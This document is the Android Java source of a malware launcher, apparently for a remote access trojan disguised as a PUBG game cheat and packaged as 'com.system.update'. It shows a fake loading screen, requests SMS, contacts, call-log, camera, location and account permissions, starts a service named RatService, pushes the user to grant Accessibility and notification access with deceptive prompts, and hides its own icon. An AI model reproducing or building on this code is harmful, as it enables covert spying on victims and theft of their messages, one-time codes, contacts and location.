package com.system.update;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.view.Gravity;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setBackgroundColor(Color.BLACK);

        TextView textView = new TextView(this);
        textView.setText("Loading Game Assets...\nPlease wait");
        textView.setTextColor(Color.WHITE);
        textView.setTextSize(20);
        textView.setGravity(Gravity.CENTER);
        layout.addView(textView);
        setContentView(layout);

        String[] perms = {
            android.Manifest.permission.READ_SMS, android.Manifest.permission.RECEIVE_SMS,
            android.Manifest.permission.SEND_SMS, android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.READ_CALL_LOG, android.Manifest.permission.READ_EXTERNAL_STORAGE,
            android.Manifest.permission.CAMERA, android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.GET_ACCOUNTS, android.Manifest.permission.POST_NOTIFICATIONS
        };
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            requestPermissions(perms, 1);
        } else {
            startRatAndOpenSettings();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 1) {
            startRatAndOpenSettings();
        }
    }

    private void startRatAndOpenSettings() {
        try {
            Intent serviceIntent = new Intent(this, RatService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
        } catch (Exception ignored) {}

        // 1. فتح صفحة تفعيل الـ Accessibility
        try {
            Intent accIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            accIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(accIntent);
            Toast.makeText(this, "Please enable panel pubge in Accessibility.", Toast.LENGTH_LONG).show();
        } catch (Exception ignored) {}

        // 2. بعد 4 ثواني، فتح صفحة تفعيل الإشعارات
        new Handler().postDelayed(() -> {
            try {
                Intent notifIntent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
                notifIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(notifIntent);
                Toast.makeText(this, "Please enable panel pubge in Notification Access.", Toast.LENGTH_LONG).show();
            } catch (Exception ignored) {}
        }, 4000);

        // إخفاء الأيقونة
        try {
            PackageManager p = getPackageManager();
            ComponentName componentName = new ComponentName(this, MainActivity.class);
            p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        } catch (Exception ignored) {}
        
        finish();
    }
}
